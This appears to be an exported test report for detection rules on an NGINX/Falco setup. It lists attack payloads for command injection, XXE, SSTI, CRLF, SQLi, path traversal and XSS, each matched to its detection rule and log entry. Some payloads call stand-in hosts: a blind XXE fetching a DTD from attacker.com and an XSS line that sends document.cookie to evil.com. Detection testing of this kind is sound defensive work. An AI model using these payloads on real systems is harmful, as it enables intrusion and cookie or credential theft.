"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_CLOUD_003` |
| **Name** | Azure account command injection |
| **Category** | CMDINJ |
| **Subcategory** | cloud_cmd |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;az account show`
- **Encoded**: `%3Baz%20account%20show`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 11:36:43.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMDI_CLOUD_003-1772192203662-xsksfl pattern_id=CMDI_CLOUD_003 uri=/?q=%3Baz%20account%20show client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMDI_CLOUD_003-1772192203662-xsksfl pattern_id=CMDI_CLOUD_003 uri=/?q=%3Baz%20account%20show client=127.0.0.1

**Falco Log Entry**:
```
11:36:43.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMDI_CLOUD_003-1772192203662-xsksfl pattern_id=CMDI_CLOUD_003 uri=/?q=%3Baz%20account%20show client=127.0.0.1
```","2","test_e2e_with_logs[453_CMDI_CLOUD_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_003` |
| **Name** | XXE expect wrapper command execution |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""expect://id"">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 11:36:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1772192174036-5ssbk pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1772192174036-5ssbk pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1

**Falco Log Entry**:
```
11:36:14.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1772192174036-5ssbk pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[531_XXE_ENTITY_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_ATTR_004` |
| **Name** | LDAP Attribute Injection via mail |
| **Category** | LDAP |
| **Subcategory** | attribute_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `)(mail=admin@target.com`
- **Encoded**: `)(mail=admin@target.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 11:36:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Attribute injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1772192174553-6bddf8 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1772192174553-6bddf8 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1

**Falco Log Entry**:
```
11:36:14.000000000: Warning [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1772192174553-6bddf8 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1
```","2","test_e2e_with_logs[408_LDAP_ATTR_004]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_ERB_001` |
| **Name** | ERB System Command Execution |
| **Category** | SSTI |
| **Subcategory** | erb |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<%= system(""id"") %>`
- **Encoded**: `%3C%25%3D%20system%28%22id%22%29%20%25%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 11:36:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_ERB_001-1772192198061-49aj58 pattern_id=SSTI_ERB_001 uri=/?q=%3C%25%3D%20system%28%22id%22%29%20%25%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_ERB_001-1772192198061-49aj58 pattern_id=SSTI_ERB_001 uri=/?q=%3C%25%3D%20system%28%22id%22%29%20%25%3E client=127.0.0.1

**Falco Log Entry**:
```
11:36:38.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_ERB_001-1772192198061-49aj58 pattern_id=SSTI_ERB_001 uri=/?q=%3C%25%3D%20system%28%22id%22%29%20%25%3E client=127.0.0.1
```","2","test_e2e_with_logs[539_SSTI_ERB_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_002` |
| **Name** | Custom Header Injection via CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\r\nX-Injected:true`
- **Encoded**: `%0d%0aX-Injected%3Atrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 11:37:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1772192223535-mboqon pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1772192223535-mboqon pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1

**Falco Log Entry**:
```
11:37:03.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1772192223535-mboqon pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1
```","2","test_e2e_with_logs[557_CRLF_HDR_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `ENC_SQLI_TRP_001` |
| **Name** | Triple-encoded OR 1=1 |
| **Category** | SQLI |
| **Subcategory** | triple_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR 1=1`
- **Encoded**: `%252527%20OR%201%3D1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 11:36:51.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_TRP_001-1772192211217-6iaoug pattern_id=ENC_SQLI_TRP_001 uri=/?q=%252527%20OR%201%3D1 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_TRP_001-1772192211217-6iaoug pattern_id=ENC_SQLI_TRP_001 uri=/?q=%252527%20OR%201%3D1 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:51.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_TRP_001-1772192211217-6iaoug pattern_id=ENC_SQLI_TRP_001 uri=/?q=%252527%20OR%201%3D1 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[680_ENC_SQLI_TRP_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_018` |
| **Name** | Dollar-paren command substitution |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(uname -a)`
- **Encoded**: `%24(uname%20-a)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 11:36:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1772192166555-2vk7k pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1772192166555-2vk7k pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1

**Falco Log Entry**:
```
11:36:06.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1772192166555-2vk7k pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1
```","2","test_e2e_with_logs[340_CMD_BASIC_018]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_ENC_001` |
| **Name** | Double-encoded X-Forwarded-Host |
| **Category** | HOST_HEADER |
| **Subcategory** | double_encoded |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `X-Forwarded-Host%3A evil.com`
- **Encoded**: `X-Forwarded-Host%253A%20evil.com`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `NONE` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[515_HHI_ENC_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 11:36:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772192177043-n582xe pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772192177043-n582xe pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
11:36:17.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772192177043-n582xe pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","3","test_e2e_with_logs[423_XXE_BLIND_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_003` |
| **Name** | cPickle.loads Remote Code Execution |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `cPickle.loads(data)`
- **Encoded**: `cPickle.loads%28data%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 11:36:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1772192204036-p2vs6p pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1772192204036-p2vs6p pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:44.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1772192204036-p2vs6p pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1
```","2","test_e2e_with_logs[487_PICKLE_DESER_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_008` |
| **Name** | IRI encoded path |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../​../etc/passwd`
- **Encoded**: `..%2F%E2%80%8B..%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 11:36:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_008-1772192188128-tmk5v pattern_id=PATH_UNI_008 uri=/?q=..%2F%E2%80%8B..%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_008-1772192188128-tmk5v pattern_id=PATH_UNI_008 uri=/?q=..%2F%E2%80%8B..%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:28.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_008-1772192188128-tmk5v pattern_id=PATH_UNI_008 uri=/?q=..%2F%E2%80%8B..%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[290_PATH_UNI_008]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_003` |
| **Name** | Redirect Injection via CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\r\nLocation:http://evil.com`
- **Encoded**: `%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 11:37:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_003-1772192224036-l7d2bb pattern_id=CRLF_HDR_003 uri=/?q=%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_003-1772192224036-l7d2bb pattern_id=CRLF_HDR_003 uri=/?q=%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
11:37:04.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_003-1772192224036-l7d2bb pattern_id=CRLF_HDR_003 uri=/?q=%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[558_CRLF_HDR_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_002` |
| **Name** | Blind XXE with Parameter Entity DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://attacker.com/evil.dtd"">%xxe;]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 11:36:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_002-1772192177545-ix42na pattern_id=XXE_BLIND_002 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_002-1772192177545-ix42na pattern_id=XXE_BLIND_002 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
11:36:17.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_002-1772192177545-ix42na pattern_id=XXE_BLIND_002 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[426_XXE_BLIND_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~80000ms
- **Timestamp**: 11:35:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772192157060-8beu8 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772192157060-8beu8 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:35:57.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1772192157060-8beu8 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[162_XSS_DOM_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_001` |
| **Name** | Overlong UTF-8 dot encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
- **Encoded**: `%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 11:36:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772192184620-sw8u8 pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772192184620-sw8u8 pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:24.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772192184620-sw8u8 pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[283_PATH_UNI_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_004` |
| **Name** | Complex mixed traversal pattern |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `.//..//.//..//etc/passwd`
- **Encoded**: `.%2F%2F..%2F%2F.%2F%2F..%2F%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 11:36:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ADV_004-1772192171584-mfiv048 pattern_id=PATH_ADV_004 uri=/?q=.%2F%2F..%2F%2F.%2F%2F..%2F%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ADV_004-1772192171584-mfiv048 pattern_id=PATH_ADV_004 uri=/?q=.%2F%2F..%2F%2F.%2F%2F..%2F%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:11.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ADV_004-1772192171584-mfiv048 pattern_id=PATH_ADV_004 uri=/?q=.%2F%2F..%2F%2F.%2F%2F..%2F%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[241_PATH_ADV_004]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_065` |
| **Name** | JavaScript Protocol Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `javascript:alert(1)`
- **Encoded**: `javascript%3Aalert%281%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 11:36:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1772192180128-9lzry pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1772192180128-9lzry pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:20.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1772192180128-9lzry pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[143_XSS_ADV_065]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
